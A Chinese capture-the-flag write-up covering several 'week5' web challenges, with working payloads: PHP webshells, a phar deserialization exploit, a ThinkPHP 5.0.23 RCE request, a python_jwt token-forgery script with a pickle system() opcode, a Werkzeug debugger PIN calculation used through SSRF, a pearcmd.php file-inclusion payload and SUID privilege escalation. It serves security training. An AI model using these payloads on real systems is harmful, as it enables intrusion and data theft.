<p>以<code>Content-Type: application/json</code>的 Header 用<code>POST</code>方法向路径<code>/submit</code>请求即可</p>
<p>然后再请求<code>/info/0</code>，找到含有 flag 的一条数据</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9479195.png" alt="image-20240218232807243"></p>
<p>flag{63834b07-2417-4e14-b558-96d8511fe3ac}</p>
<p>真的难 做吐了</p>
<h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><h3 id="Unserialize-Again"><a href="#Unserialize-Again" class="headerlink" title="Unserialize Again"></a>Unserialize Again</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240218234656806.png?lastModify=1715614296" alt="image-20240218234656806"></p>
<p>发现提示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240218235042362.png?lastModify=1715614296" alt="image-20240218235042362"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240218235155564.png?lastModify=1715614296" alt="image-20240218235155564"></p>
<p>找到源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);  </span><br><span class="line">class story&#123;</span><br><span class="line">    private $user=&#x27;admin&#x27;;</span><br><span class="line">    public $pass;</span><br><span class="line">    public $eating;</span><br><span class="line">    public $God=&#x27;false&#x27;;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        $this-&gt;user=&#x27;human&#x27;;</span><br><span class="line">        if(1==1)&#123;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if(1!=1)&#123;</span><br><span class="line">            echo $fffflag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;user=&#x27;AshenOne&#x27;;</span><br><span class="line">        $this-&gt;eating=&#x27;fire&#x27;;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __tostring()&#123;</span><br><span class="line">        return $this-&gt;user.$this-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        if($this-&gt;user==&#x27;admin&#x27;&amp;&amp;$this-&gt;pass==&#x27;admin&#x27;)&#123;</span><br><span class="line">            echo $nothing;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;God==&#x27;true&#x27;&amp;&amp;$this-&gt;user==&#x27;admin&#x27;)&#123;</span><br><span class="line">            system($this-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#x27;Get Out!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                 </span><br><span class="line">if(isset($_GET[&#x27;pear&#x27;])&amp;&amp;isset($_GET[&#x27;apple&#x27;]))&#123;</span><br><span class="line">    // $Eden=new story();</span><br><span class="line">    $pear=$_GET[&#x27;pear&#x27;];</span><br><span class="line">    $Adam=$_GET[&#x27;apple&#x27;];</span><br><span class="line">    $file=file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">    file_put_contents($pear,urldecode($file));</span><br><span class="line">    file_exists($Adam);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;多吃雪梨&#x27;;</span><br><span class="line">&#125; 多吃雪梨</span><br></pre></td></tr></table></figure>

<p>phar反序列化</p>
<p>测当前页面在&#x2F;var&#x2F;www&#x2F;html下</p>
<p>把php:&#x2F;&#x2F;input的内容写进<code>$pear 中，文件的路径和名称我们都可控，只要大胆猜测当前页面在/var/www/html下即可（做题的经验），将payload：&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt; urlencode后传入即可。</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219155546050.png?lastModify=1715614296" alt="image-20240219155546050"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219155559071.png?lastModify=1715614296" alt="image-20240219155559071"></p>
<p>预期解：</p>
<p>再来讲预期解，能传入文件，有反序列化，又有<code>file_exists（）函数，一看就是phar反序列化了，反序列化很简单，只要绕过__wakeup函数即可，查看php版本为7.0.9，只要让真实属性值不匹配即可。</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class story&#123;</span><br><span class="line">    public $eating = &#x27;cat /f*&#x27;;</span><br><span class="line">    public $God=&#x27;true&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //生成时后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">$o = new story();</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>将生成的phar.phar文件打开，将2改成大于2的值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219160051286.png?lastModify=1715614296" alt="image-20240219160051286"></p>
<p>因为我们修改了phar.phar的值，因此该文件的签名与修改后的文件不匹配，我们需要用脚本更新签名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from hashlib import sha1</span><br><span class="line"> </span><br><span class="line">import gzip</span><br><span class="line"> </span><br><span class="line">file = open(r&#x27;D:\phpstudy_pro\WWW\php\phar.phar&#x27;, &#x27;rb&#x27;).read()  #文件的路径</span><br><span class="line"> </span><br><span class="line">data = file[:-28]  # 获取需要签名的数据</span><br><span class="line"># data = data.replace(b&#x27;3:&#123;&#x27;, b&#x27;4:&#123;&#x27;) #更换属性值，绕过__wakeup</span><br><span class="line"> </span><br><span class="line">final = file[-8:]  # 获取最后8位GBMB标识和签名类型</span><br><span class="line"> </span><br><span class="line">newfile = data + sha1(data).digest() + final  # 数据 + 签名 + 类型 + GBMB</span><br><span class="line"> </span><br><span class="line">open(r&#x27;D:\phpstudy_pro\WWW\php\new.phar&#x27;, &#x27;wb&#x27;).write(newfile)  # 写入到新的phar文件</span><br><span class="line"> </span><br><span class="line">newf = gzip.compress(newfile)</span><br><span class="line">with open(r&#x27;D:\phpstudy_pro\WWW\php\2.jpg&#x27;, &#x27;wb&#x27;) as file: #更改文件后缀</span><br><span class="line">     file.write(newf)</span><br></pre></td></tr></table></figure>

<p> 改完后上传文件，利用phar协议访问即可</p>
<p>?pear&#x3D;1.phar&amp;apple&#x3D;phar:&#x2F;&#x2F;1.phar</p>
<p>好难</p>
<h3 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219160453669.png?lastModify=1715614296" alt="image-20240219160453669"></p>
<p>thinkphp v5</p>
<p>考虑ThinkPHP版本的漏洞</p>
<p>让它报错看下版本</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219160848137.png?lastModify=1715614296" alt="image-20240219160848137"></p>
<p>V5.0.23</p>
<p>然后直接上网搜该版本存在的漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=ThinkPHP是一款运用极广的PHP开发框架</span><br><span class="line"></span><br><span class="line">其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞</span><br><span class="line"></span><br><span class="line">1.访问靶机地址+端口号 进入首页</span><br><span class="line">2.bp抓包变更请求为POST，传入参数，其中pwd为系统执行命令可进行一系列操作</span><br><span class="line">3._method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=pwd</span><br></pre></td></tr></table></figure>



<p>首先抓包进行传参</p>
<p>GET:index.php?s&#x3D;captcha POST:_method&#x3D;__construct&amp;filter[]&#x3D;phpinfo&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;1</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219171814208.png?lastModify=1715614296" alt="image-20240219171814208"></p>
<p>这个参数1 是可以进行修改的</p>
<p>回显了phpinfo</p>
<p>发现命令执行参数全被ban</p>
<p>上传一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo%20&#x27;&lt;?php%20eval($_POST[&#x27;cmd&#x27;]);?&gt;&#x27;%20&gt;%20/var/www/public/1.php</span><br></pre></td></tr></table></figure>

<p>然后蚁剑连接后发现根目录下存在flag文件 但是里面内容没有</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219175455145.png?lastModify=1715614296" alt="image-20240219175455145"></p>
<p>可能是没权限</p>
<p>进入终端看一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219181234415.png?lastModify=1715614296" alt="image-20240219181234415"></p>
<p>rwx 最高权限才能读</p>
<p>查看具有SUID权限的命令</p>
<p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219181608901.png?lastModify=1715614296" alt="image-20240219181608901"></p>
<p>没有回显？</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219181704573.png?lastModify=1715614296" alt="image-20240219181704573"></p>
<p>但是可以读取</p>
<p>cp &#x2F;flag_dd3f6380aa0d &#x2F;dev&#x2F;stdout</p>
<p>别人的：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219181732813.png?lastModify=1715614296" alt="image-20240219181732813"></p>
<p>flag{95abea1a-063c-437a-89a1-cd7a88b65a38}</p>
<h3 id="Ye’s-Pickle"><a href="#Ye’s-Pickle" class="headerlink" title="Ye’s Pickle"></a>Ye’s Pickle</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219183714079.png?lastModify=1715614296" alt="image-20240219183714079"></p>
<p>Pickle反序列化和jwt加密</p>
<p>Funweb的python_jwt的CVE-2022-39227</p>
<p>有token:</p>
<p>eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDgzNDI3MzYsImlhdCI6MTcwODMzOTEzNiwianRpIjoibG81ZVJ4bzNtUFlEWldtNzNSTi1QQSIsIm5iZiI6MTcwODMzOTEzNiwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.GhmLODYuwaap1dMW_moY0tk2fnTGOPzh1hIC6mqeTJQErgGcFLT9kcm-V8h-fRcmZzBAoDk_N02MYDa1S1f13xCdNviItCCi2bJTyG-a05rktpJ5O6Erj5A9TiHmZIU8vr5AJsKgsZ2MdDbQnr0R-cYTiuCQezKe37L0lEBdpT0P9F6HI4tnaXx8asXHb16HH8eavyat5oLLqDx_oqe4vIlOCiDOC4R0ZNz-ySNfoGSGlliOjKqRBNHUb_WyJF37qV5APRuq-qlQqFozzUabQfwFuQvYH0D-YDSEiHtpMuWLumUPCECKsHPs60LXW6_taoB4Cjp9R1sVIecnKjm1Zg</p>
<p>别人的脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">from datetime import timedelta </span><br><span class="line">from json import loads, dumps </span><br><span class="line">from jwcrypto.common import base64url_decode, base64url_encode  </span><br><span class="line">def topic(topic):</span><br><span class="line">    &quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span><br><span class="line">    [header, payload, signature] = topic.split(&#x27;.&#x27;)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    parsed_payload[&#x27;role&#x27;] = &quot;admin&quot;</span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(&#x27;,&#x27;, &#x27;:&#x27;))))</span><br><span class="line">    return &#x27;&#123;&quot;  &#x27; + header + &#x27;.&#x27; + fake_payload + &#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27; + header + &#x27;&quot;, &quot;payload&quot;:&quot;&#x27; + payload + &#x27;&quot;,&quot;signature&quot;:&quot;&#x27; + signature + &#x27;&quot;&#125;&#x27;</span><br><span class="line">token = topic(&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTc2ODkzNjQsImlhdCI6MTY5NzY4NTc2NCwianRpIjoiOTFvNVVqWXJPTUFmMmRYTVBaajFDUSIsIm5iZiI6MTY5NzY4NTc2NCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.jc3SP9ETBLURk3lRZZTPsgg-GQIuPpsIBkR710myDdFVy8e1PkVg7vbI4WTj8nnvh_ly9bD2sJJB3MSyXpTRj2ofPTitRjVWf9uZNjG1llWs21aHhjr9JUTPTPrYrQ0DpdvUUGudzV9raR5GSq28Qb_iLEQ4XIWKoGDtFNOvLeqcJcGotR1ygYAuPpTHaX2xidlzSYDbSbBGE55GI1zFS1w1PmsgliAyEJ1Z5IKz5qVZ07D6M-55L15cgWcaoQ9psjCyR4xX4A9GKPlYLwGxLVH0bRRkuyQn2l5JRBAzpMus7qY4srbLwF8XUPqKbje1vaUOt2DAsZA_SeAGw2iziQ&#x27;)</span><br><span class="line">print(token) opcode=b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;&#x27; </span><br><span class="line">tRcos </span><br><span class="line">system </span><br><span class="line">(S&#x27;whoami&#x27; </span><br><span class="line">tR.&#x27;&#x27;&#x27; </span><br><span class="line">print(base64.b64encode(opcode))</span><br></pre></td></tr></table></figure>



<h3 id="pppython"><a href="#pppython" class="headerlink" title="pppython?"></a>pppython?</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    </span><br><span class="line">    if ($_REQUEST[&#x27;hint&#x27;] == [&quot;your?&quot;, &quot;mine!&quot;, &quot;hint!!&quot;])&#123;</span><br><span class="line">        header(&quot;Content-type: text/plain&quot;);</span><br><span class="line">        system(&quot;ls / -la&quot;);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    try &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]);</span><br><span class="line">        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST[&#x27;lolita&#x27;]);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        echo $output;</span><br><span class="line">        curl_close($ch);   </span><br><span class="line">    &#125;catch (Error $x)&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">        highlight_string($x-&gt;getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt; curl_setopt(): The CURLOPT_HTTPHEADER option must have an array value </span><br></pre></td></tr></table></figure>

<p>curl?</p>
<p>?hint[0]&#x3D;your?&amp;hint[1]&#x3D;mine!&amp;hint[2]&#x3D;hint!!</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219185041884.png?lastModify=1715614296" alt="image-20240219185041884"></p>
<p>有flag文件 但是权限不够 还有一个app.py</p>
<p>用file协议去读取一下app.py的内容</p>
<p>?url&#x3D;file:&#x2F;&#x2F;&#x2F;app.py&amp;lolita[]&#x3D;0</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219185343796.png?lastModify=1715614296" alt="image-20240219185343796"></p>
<p>把它整理一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, session, render_template, render_template_string </span><br><span class="line">import os, base64 </span><br><span class="line">#from NeepuF1Le import neepu_files </span><br><span class="line">app = Flask(__name__) </span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = &#x27;******&#x27; </span><br><span class="line">@app.route(&#x27;/&#x27;) </span><br><span class="line">def welcome(): </span><br><span class="line">    if session[&quot;islogin&quot;] == True: </span><br><span class="line">        return &quot;flag&#123;***********************&#125;&quot; </span><br><span class="line">    app.run(&#x27;0.0.0.0&#x27;, 1314, debug=True)</span><br></pre></td></tr></table></figure>

<p>是一个开了debug的flask监听在1314端口</p>
<p>计算cookie值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#sha1</span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [    </span><br><span class="line">    &#x27;root&#x27;# /etc/passwd, /etc/shadow验证    </span><br><span class="line">    &#x27;flask.app&#x27;,# 默认值    </span><br><span class="line">    &#x27;Flask&#x27;,# 默认值    </span><br><span class="line">    &#x27;/usr/local/lib/python3.10/dist-packages/flask/app.py&#x27; # 报错得到]</span><br><span class="line">bid = &quot;8cab9c97-85be-4fb4-9d17-29335d7b2b8a&quot;</span><br><span class="line">did = &quot;12:hugetlb:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod9a6962f3_0518_44b9_b39d_99b5cbdcbde2.slice/docker-5393cbb4c79037280b98e5c09ab1df1a765d545afcde1166a1af321b068488e8.scope&quot;</span><br><span class="line">did = did.strip().rpartition(&quot;/&quot;)[2]</span><br><span class="line">print(did)</span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;46292774133529&#x27;,#  /sys/class/net/eth0/address 16进制转10进制 </span><br><span class="line">    #machine_id由三个合并(docker就后两个)：1. /etc/machine-id2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><br><span class="line">    bid+did#  /proc/sys/kernel/random/boot_id</span><br><span class="line">]</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line">    </span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">           rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                         for x in range(0, len(num), group_size))</span><br><span class="line">           break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line">def hash_pin(pin: str) -&gt; str:</span><br><span class="line">    return hashlib.sha1(f&quot;&#123;pin&#125; added salt&quot;.encode(&quot;utf-8&quot;, &quot;replace&quot;)).hexdigest()[:12]</span><br><span class="line">print(rv)</span><br><span class="line">print(cookie_name + &quot;=&quot; + f&quot;&#123;int(time.time())&#125;|&#123;hash_pin(rv)&#125;&quot;)</span><br><span class="line">    #890KUjqCgmGiRRNLpH8a</span><br><span class="line">    #http://localhost:1314/console?&amp;__debugger__=yes&amp;cmd=__import__(&quot;os&quot;).popen(&quot;ps&quot;).read()&amp;frm=0&amp;s=890KUjqCgmGiRRNLpH8a</span><br></pre></td></tr></table></figure>

<p>结果：__wzd3d910b5d784ac96048c1&#x3D;1702047018|3fe90e7adf4c</p>
<p>所以：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?lolita[]=Cookie:__wzd3d910b5d784ac96048c1=1702047018|3fe90e7adf4c &amp;url=http://127.0.0.1:1314/console? &amp;__debugger__=yes&amp;pin=200-001-804 &amp;cmd=__import__(&quot;os&quot;).popen(&quot;ls&quot;).read() &amp;frm=0 &amp;s=lrLipQkNez3cZzDYShlU</span><br></pre></td></tr></table></figure>

<p>但是：需要对&amp;和空格进行url编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?lolita[]=Cookie:__wzd3d910b5d784ac96048c1=1702047018|3fe90e7adf4c&amp;url=http://127.0.0.1:1314/console?%26__debugger__=yes%26pin=200-001-804%26cmd=__import__(&quot;os&quot;).popen(&quot;cat%2B/flag&quot;).read()%26frm=0%26s=lrLipQkNez3cZzDYShlU</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219191152178.png?lastModify=1715614296" alt="image-20240219191152178"></p>
<h3 id="4-复盘"><a href="#4-复盘" class="headerlink" title="4-复盘"></a>4-复盘</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219191409098.png?lastModify=1715614296" alt="image-20240219191409098"></p>
<p>根据前面的misc题可以拿到源码，其中关键代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php         </span><br><span class="line">if (isset($_GET[&#x27;page&#x27;])) &#123;          </span><br><span class="line">    $page =&#x27;pages/&#x27; .$_GET[&#x27;page&#x27;].&#x27;.php&#x27;;        </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;          </span><br><span class="line">    $page = &#x27;pages/dashboard.php&#x27;;        </span><br><span class="line">&#125;        </span><br><span class="line">if (file_exists($page)) &#123;          </span><br><span class="line">    require_once $page;         </span><br><span class="line">&#125;</span><br><span class="line">else&#123;          </span><br><span class="line">    require_once &#x27;pages/error_page.php&#x27;;        </span><br><span class="line">&#125; ?&gt;</span><br></pre></td></tr></table></figure>

<p>存在很明显的文件包含漏洞，与week3类似，包含pearcmd.php即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.php?+config-create+/&amp;page=/../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[1])?&gt;+/var/www/html/1.php</span><br></pre></td></tr></table></figure>

<p>写入Shell后就是一个SUID提权</p>
<p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219191557322.png?lastModify=1715614296" alt="image-20240219191557322"></p>
<p>gzip命令有SUID权限</p>
<p>gzip -f &#x2F;flag -t</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219191705176.png?lastModify=1715614296" alt="image-20240219191705176"></p>
<p>flag{sample_flag}</p>
<h3 id="NextDrive"><a href="#NextDrive" class="headerlink" title="NextDrive"></a>NextDrive</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219191939079.png?lastModify=1715614296" alt="image-20240219191939079"></p>
<p>提示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219191955015.png?lastModify=1715614296" alt="image-20240219191955015"></p>
<p>随便注册一个账号，把公共资源区的文件都下下来看看，发现这个文件中有蹊跷</p>
<p>test.res.http</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">content-type: application/json; charset=utf-8</span><br><span class="line">content-length: 50</span><br><span class="line">date: Tue, 06 Oct 2023 13:39:21 GMT</span><br><span class="line">connection: keep-alive</span><br><span class="line">keep-alive: timeout=5</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;success&quot;,&quot;logged&quot;:true,&quot;data&quot;:[&#123;&quot;name&quot;:&quot;すずめ feat.十明 - RADWIMPS,十明.flac&quot;,&quot;hash&quot;:&quot;5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc&quot;,&quot;size&quot;:27471829,&quot;uploader&quot;:&quot;admin&quot;,&quot;uploader_uid&quot;:&quot;100000&quot;,&quot;shareTime&quot;:1708341555726,&quot;isYours&quot;:true,&quot;isOwn&quot;:true,&quot;ownFn&quot;:&quot;すずめ feat.十明 - RADWIMPS,十明.flac&quot;&#125;,&#123;&quot;name&quot;:&quot;Windows 12 